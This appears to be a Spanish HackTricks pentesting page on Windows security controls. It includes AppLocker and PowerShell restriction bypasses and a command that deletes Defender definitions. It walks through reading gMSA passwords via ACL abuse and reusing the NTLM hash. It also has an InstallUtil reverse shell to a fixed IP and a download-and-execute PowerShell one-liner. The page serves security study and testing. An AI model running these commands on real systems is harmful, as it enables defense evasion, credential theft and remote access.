# Controles de Seguridad de Windows

{{#include ../../banners/hacktricks-training.md}}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que están permitidos en un sistema y pueden ejecutarse. El objetivo es proteger el entorno contra malware dañino y software no aprobado que no se alinea con las necesidades específicas del negocio de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de lista blanca de aplicaciones** de Microsoft y da a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLLs, aplicaciones empaquetadas y empaquetadores de instaladores de aplicaciones.\
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto puede ser eludido**.

### Comprobar

Comprueba qué archivos/extensiones están en la lista negra/lista blanca:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, proporcionando una forma de revisar el conjunto actual de reglas impuestas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Carpetas útiles **con permiso de escritura** para bypass AppLocker Policy: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, existen **carpetas con permiso de escritura** que puedes usar para **bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Los binarios comúnmente **confiables** [**"LOLBAS's"**](https://lolbas-project.github.io/) también pueden ser útiles para bypass AppLocker.
- **Reglas mal escritas también podrían ser bypassed**
- Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y será permitida.
- Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero se olvidan de las **otras** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** debido a la carga adicional que puede imponer en un sistema y la cantidad de pruebas necesarias para asegurar que nada falle. Por eso usar **DLLs como backdoors ayudará a bypass AppLocker**.
- Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar PowerShell** code en cualquier proceso y bypass AppLocker. Para más info consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de credenciales

### Administrador de cuentas de seguridad (SAM)

Las credenciales locales están presentes en este archivo; las contraseñas están almacenadas como hashes.

### Autoridad de seguridad local (LSA) - LSASS

Las **credenciales** (almacenadas como hashes) se **guardan** en la **memoria** de este subsistema por motivos de Single Sign-On.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), **autenticación**, **tokens de acceso**...\
LSA será quien **compruebe** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **hable** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets Kerberos, hashes NT y LM, contraseñas fácilmente descifrables.

### LSA secrets

LSA puede guardar en disco algunas credenciales:

- Contraseña de la cuenta del equipo del Active Directory (controlador de dominio no accesible).
- Contraseñas de las cuentas de los servicios de Windows
- Contraseñas de tareas programadas
- Más (contraseña de aplicaciones IIS...)

### NTDS.dit

Es la base de datos del Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) es un antivirus disponible en Windows 10 y Windows 11, y en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de eludir estas protecciones.

### Check

Para comprobar el **estado** de **Defender** puedes ejecutar el cmdlet de PowerShell **`Get-MpComputerStatus`** (revisa el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo también podrías ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de archivos cifrado (EFS)

EFS protege archivos mediante cifrado, utilizando una **clave simétrica** conocida como **File Encryption Key (FEK)**. Esta clave se cifra con la **clave pública** del usuario y se almacena dentro del flujo de datos alternativo $EFS del archivo cifrado. Cuando se necesita descifrar, se usa la **clave privada** correspondiente del certificado digital del usuario para descifrar la FEK desde el flujo $EFS. Más detalles pueden encontrarse [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Escenarios de descifrado sin intervención del usuario** incluyen:

- Cuando archivos o carpetas se mueven a un sistema de archivos no-EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se descifran automáticamente.
- Archivos cifrados enviados por la red vía el protocolo SMB/CIFS se descifran antes de la transmisión.

Este método de cifrado permite **acceso transparente** a los archivos cifrados para el propietario. Sin embargo, simplemente cambiar la contraseña del propietario e iniciar sesión no permitirá el descifrado.

**Puntos clave**:

- EFS usa una FEK simétrica, cifrada con la clave pública del usuario.
- El descifrado emplea la clave privada del usuario para acceder a la FEK.
- El descifrado automático ocurre en condiciones específicas, como copiar a FAT32 o transmisión por red.
- Los archivos cifrados son accesibles para el propietario sin pasos adicionales.

### Check EFS info

Check si un **user** ha **used** este **service** comprobando si existe esta ruta:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file usando cipher /c \<file\>  
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Decrypting EFS files

#### Tener privilegios de SYSTEM

Este método requiere que el **victim user** esté **ejecutando** un **process** dentro del host. Si ese es el caso, usando una sesión `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` from `incognito`). O simplemente podrías `migrate` al process del usuario.

#### Conocer la contraseña del usuario


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Cuentas de servicio administradas de grupo (gMSA)

Microsoft desarrolló **Group Managed Service Accounts (gMSA)** para simplificar la gestión de cuentas de servicio en infraestructuras TI. A diferencia de las cuentas de servicio tradicionales que a menudo tienen la opción "**Password never expire**" habilitada, las gMSA ofrecen una solución más segura y manejable:

- **Gestión automática de contraseñas**: las gMSA usan una contraseña compleja de 240 caracteres que cambia automáticamente según la política de dominio o equipo. Este proceso lo gestiona el Key Distribution Service (KDC) de Microsoft, eliminando la necesidad de actualizaciones manuales de contraseña.
- **Mayor seguridad**: estas cuentas son inmunes a bloqueos y no pueden usarse para inicios de sesión interactivos, mejorando su seguridad.
- **Compatibilidad con múltiples hosts**: las gMSA pueden compartirse entre varios hosts, lo que las hace ideales para servicios que se ejecutan en múltiples servidores.
- **Capacidad para tareas programadas**: a diferencia de las managed service accounts, las gMSA soportan la ejecución de tareas programadas.
- **Gestión simplificada de SPN**: el sistema actualiza automáticamente el Service Principal Name (SPN) cuando hay cambios en los detalles sAMAccount del equipo o en el nombre DNS, simplificando la gestión de SPN.

Las contraseñas de las gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y son reiniciadas automáticamente cada 30 días por los Domain Controllers (DCs). Esta contraseña, un blob de datos cifrados conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), sólo puede ser recuperada por administradores autorizados y por los servidores en los que están instaladas las gMSA, asegurando un entorno protegido. Para acceder a esta información se requiere una conexión segura como LDAPS, o que la conexión esté autenticada con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encuentra más información en este post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Además, consulta esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un **NTLM relay attack** para **leer** la **contraseña** de **gMSA**.

### Abusar de encadenamiento de ACL para leer la contraseña gestionada de gMSA (GenericAll -> ReadGMSAPassword)

En muchos entornos, usuarios con pocos privilegios pueden pivotar hacia secretos de gMSA sin comprometer el DC aprovechando ACLs de objetos mal configuradas:

- Un grupo que puedes controlar (p. ej., mediante GenericAll/GenericWrite) tiene concedido `ReadGMSAPassword` sobre un gMSA.
- Al agregarte a ese grupo, heredas el derecho a leer el blob `msDS-ManagedPassword` del gMSA vía LDAP y derivar credenciales NTLM utilizables.

Flujo de trabajo típico:

1) Descubre la ruta con BloodHound y marca tus principals de foothold como Owned. Busca edges como:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Agrégate al grupo intermedio que controlas (ejemplo con bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leer la contraseña administrada de gMSA vía LDAP y derivar el hash NTLM. NetExec automatiza la extracción de `msDS-ManagedPassword` y la conversión a NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentícate como el gMSA usando el hash NTLM (no se necesita plaintext). Si la cuenta está en Remote Management Users, WinRM funcionará directamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notas:
- LDAP reads of `msDS-ManagedPassword` require sealing (p. ej., LDAPS/sign+seal). Las herramientas manejan esto automáticamente.
- A los gMSAs a menudo se les conceden permisos locales como WinRM; valida la pertenencia a grupos (p. ej., Remote Management Users) para planificar movimiento lateral.
- Si solo necesitas el blob para calcular el NTLM tú mismo, consulta la estructura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponible para descargar desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite la gestión de las contraseñas del administrador local. Estas contraseñas, que son **aleatorias**, únicas y **cambiadas regularmente**, se almacenan de forma central en Active Directory. El acceso a estas contraseñas está restringido mediante ACLs a usuarios autorizados. Con los permisos suficientes, se otorga la capacidad de leer las contraseñas del administrador local.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **restringe muchas de las características** necesarias para usar PowerShell de forma efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.

### **Comprobar**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
En las versiones actuales de Windows ese Bypass no funcionará pero puedes usar[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo puede que necesites** **para** _**Agregar una referencia**_ -> _Examinar_ ->_Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para ejecutar código Powershell en cualquier proceso y eludir el modo constricto. Para más info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Política de ejecución de PS

Por defecto está configurado como **restricted.** Principales formas de eludir esta política:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Más información se puede encontrar [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Es la API que se puede usar para autenticar usuarios.

El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que quieran comunicarse. El método preferido para esto es Kerberos. Luego el SSPI negociará qué protocolo de autenticación se utilizará; estos protocolos de autenticación se llaman Security Support Provider (SSP), están ubicados dentro de cada máquina Windows en forma de DLL y ambas máquinas deben soportar el mismo para poder comunicarse.

### Main SSPs

- **Kerberos**: The preferred one
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers and LDAP, password in form of a MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL and TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
